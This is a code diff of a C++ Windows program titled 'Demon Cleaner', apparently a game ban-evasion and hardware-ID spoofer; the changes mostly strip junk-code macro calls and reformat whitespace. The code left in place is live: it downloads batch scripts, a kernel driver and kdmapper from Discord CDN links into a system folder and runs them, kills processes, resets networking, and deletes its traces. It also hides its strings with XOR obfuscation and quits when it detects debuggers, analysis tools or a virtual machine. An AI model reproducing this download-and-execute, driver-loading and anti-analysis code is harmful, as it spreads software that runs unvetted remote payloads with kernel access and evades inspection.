@@ -83,7 +83,7 @@ void adbg_GetTickCount(void)
 
     if (found)
     {
-        
+
 
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -99,10 +99,10 @@ void DBG_MSG(WORD dbg_code, const char* message)
 #ifdef SHOW_DEBUG_MESSAGES
 
 
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+    OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
     system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
     SetLastError(1);
     exit(0);
@@ -118,15 +118,15 @@ void adbg_CheckRemoteDebuggerPresent(void)
 
     if (found)
     {
-   
+
 
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-    system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
-    SetLastError(1);
-    exit(0);
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
     }
 }
 
@@ -260,10 +260,10 @@ void SizeOfImage()
 void apex()
 {
 
-    CppJunkCodeFucker();
+    
     JUNK_CODE_ONE
         JUNK_CODE_ONE
-    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
+        std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
     std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -273,8 +273,8 @@ void apex()
 }
 void gta()
 {
-    JunkCodeFucker();
-    CppJunkCodeFucker();
+    
+    
 
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
@@ -285,8 +285,8 @@ void gta()
 }
 void fortnite()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
 
     std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
@@ -296,8 +296,8 @@ void fortnite()
 }
 void fishingplanet()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
@@ -307,8 +307,8 @@ void fishingplanet()
 }
 void cod()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
     std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
@@ -320,8 +320,8 @@ void cod()
 
 
 void cleaner() {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
@@ -430,8 +430,8 @@ void cleaner() {
 }
 void deleter()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
 
     //delete the files we downloaded
     system("cd C:\\Windows\Vss\\");
@@ -443,15 +443,15 @@ void deleter()
     system(XorStr("del C:\\Windows\\Vss\\gta.bat").c_str());
     system(XorStr("del C:\\Windows\\Vss\\Fortnite.bat").c_str());
 
-    
+
 }
 
 void safeshutdown()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
     system(XorStr("cls").c_str());
-    CppJunkCodeFucker();
+    
     string a;
     std::cout << RED << "\nunloading kernel modules";
     Sleep(3500);
@@ -493,8 +493,8 @@ void safeshutdown()
 }
 void driverdetect()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
     const TCHAR* devices[] = {
 _T("\\\\.\\Dumper"),
 _T("\\\\.\\KsDumper")
@@ -519,14 +519,14 @@ _T("\\\\.\\KsDumper")
 
 void spoofer()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
-        CppJunkCodeFucker();
+    
+    
+    
 
 
 
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
-    string spooferpath = "C:\\Windows\\Vss\\woof.sys"; 
+    string spooferpath = "C:\\Windows\\Vss\\woof.sys";
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
     string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
@@ -537,7 +537,7 @@ void spoofer()
     Sleep(2000);
     deleter();
     Sleep(2000);
-    CppJunkCodeFucker();
+    
     system(XorStr("NETSH WINSOCK RESET").c_str());
     system(XorStr("NETSH INT IP RESET").c_str());
     system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
@@ -575,56 +575,56 @@ vector<string> serial;
 
 void loadserial()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
 
     serial.push_back(XorStr("384604182").c_str());
     serial.push_back(XorStr("2953439145").c_str());
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
 }
 
 void mainbot()
 {
-    JunkCodeFucker();
-        CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
+    
     TCHAR volumeName[MAX_PATH + 1] = { 0 };
     TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
     DWORD serialNumber = 0;
     DWORD maxComponentLen = 0;
     DWORD fileSystemFlags = 0;
-    CppJunkCodeFucker();
-    JunkCodeFucker();
     
-    JunkCodeFucker();
-        CppJunkCodeFucker();
-        JunkCodeFucker();
+    
+
+    
+    
+    
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
-        JunkCodeFucker();
-            CppJunkCodeFucker();
-        JunkCodeFucker();
+        
+        
+        
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
             MemoryBreakpointDebuggerCheck();
 
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            JunkCodeFucker();
+            
             SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
             setcolor(12);
             std::cout << " _| |___ _____ ___ ___ \n";
             std::cout << "| . | -_|     | . |   |\n";
             std::cout << "|___|___|_|_|_|___|_|_|\n";
-            JunkCodeFucker();
+            
             std::cout << "\n";
 
             system(XorStr("start http://demoncleaner.gq").c_str());
@@ -637,8 +637,8 @@ void mainbot()
             std::cout << GREEN << "\nloading in memory...";
             Sleep(2400);
             system(XorStr("cls").c_str());
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
             cleaner();
             fishingplanet();
             gta();
@@ -646,28 +646,28 @@ void mainbot()
             cod();
             fortnite();
             spoofer();
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
         }
-        
+
         else
         {
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
             system(XorStr("cls").c_str());
             std::cout << CYAN << "Sorry but you are not in our database or you are banned. " << std::endl;
             std::cout << GREEN << "serial : ";
             std::cout << serialNumber << std::endl;
             Sleep(3000);
-            CppJunkCodeFucker();
-            JunkCodeFucker();
+            
+            
             exit(0);
 
         }
-        
+
     }
-    
-    
+
+
 }
 
 
@@ -712,7 +712,7 @@ void otherthing()
 }
 void HideFromDebugger()
 {
-    CppJunkCodeFucker();
+    
     OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -754,74 +754,74 @@ inline bool HideThread(HANDLE hThread)
 void startup();
 int _start()
 {
-    CppJunkCodeFucker();
-    JunkCodeFucker();
-        HideThread;
+    
+    
+    HideThread;
     startup();
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
+    
 
 }
 void startup()
 {
+
     
-    CppJunkCodeFucker();
-    JunkCodeFucker();
+    
     LPCWSTR windowName = L"x32dbg";
     LPCWSTR vmname = L"VMware Workstation";
-    JunkCodeFucker();
     
-    JunkCodeFucker();
 
     
-    JunkCodeFucker();
-        if (CheckTEB())
-        {
-            trampoline;
-            CppJunkCodeFucker();
-            JunkCodeFucker();
-                OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
-            SetLastError(1);
-            exit(0);
-        }
-        if (IsDebuggerPresent())
-        {
-            trampoline;
-            CppJunkCodeFucker();
-            JunkCodeFucker();
-                OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
-            SetLastError(1);
-            exit(0);
-        }
-    
-        if (FindWindow(NULL, windowName))
-        {
-            trampoline;
-            CppJunkCodeFucker();
-            JunkCodeFucker();
-                OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
-            SetLastError(1);
-            exit(0);
 
-        }
-     
+
+    
+    if (CheckTEB())
+    {
+        trampoline;
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsDebuggerPresent())
+    {
+        trampoline;
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+
+    if (FindWindow(NULL, windowName))
+    {
+        trampoline;
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+
+    }
+
     if (FindWindow(NULL, vmname))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
+        
+        
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -831,55 +831,55 @@ void startup()
         exit(0);
 
     }
-    JunkCodeFucker();
-
-       
+    
 
 
-        
-
-        if (GetLastError == 0)
-        {
 
 
-            CppJunkCodeFucker();
-            JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            HideFromDebugger();
-            driverdetect();
-            build_date();
-            build_time();
-            loadserial();
-            CppJunkCodeFucker();
-            JunkCodeFucker();
 
-                CppJunkCodeFucker();
-                JunkCodeFucker();
-                mainbot();
-            CppJunkCodeFucker();
-            
 
-                
-        }
+    if (GetLastError == 0)
+    {
+
 
         
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        HideFromDebugger();
+        driverdetect();
+        build_date();
+        build_time();
+        loadserial();
+        
+        
+
+        
+        
+        mainbot();
+        
+
+
 
     }
+
+
+
+}
 
 int main()
 {
     if (IsProcessRunning(L"ida.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -887,12 +887,12 @@ int main()
     if (IsProcessRunning(L"ProcessHacker.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -900,12 +900,12 @@ int main()
     if (IsProcessRunning(L"Fiddler.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -913,12 +913,12 @@ int main()
     if (IsProcessRunning(L"Fiddler.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -926,12 +926,12 @@ int main()
     if (IsProcessRunning(L"Wireshark.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -939,12 +939,12 @@ int main()
     if (IsProcessRunning(L"PETools.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -952,12 +952,12 @@ int main()
     if (IsProcessRunning(L"procexp.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -965,12 +965,12 @@ int main()
     if (IsProcessRunning(L"ImmunityDebugger.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -978,12 +978,12 @@ int main()
     if (IsProcessRunning(L"ida64.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -991,12 +991,12 @@ int main()
     if (IsProcessRunning(L"windbg.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -1004,12 +1004,12 @@ int main()
     if (IsProcessRunning(L"httpdebugger.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -1017,12 +1017,12 @@ int main()
     if (IsProcessRunning(L"x32dbg.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO IDA x32dbg detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -1030,12 +1030,12 @@ int main()
     if (IsProcessRunning(L"x64dbg.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
@@ -1043,72 +1043,72 @@ int main()
     if (IsProcessRunning(L"idaq.exe"))
     {
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
     if (IsProcessRunning(L"idaq64.exe"))
     {
-        JunkCodeFucker();
+        
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
     if (IsProcessRunning(L"ollydbg.exe"))
     {
-        JunkCodeFucker();
+        
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
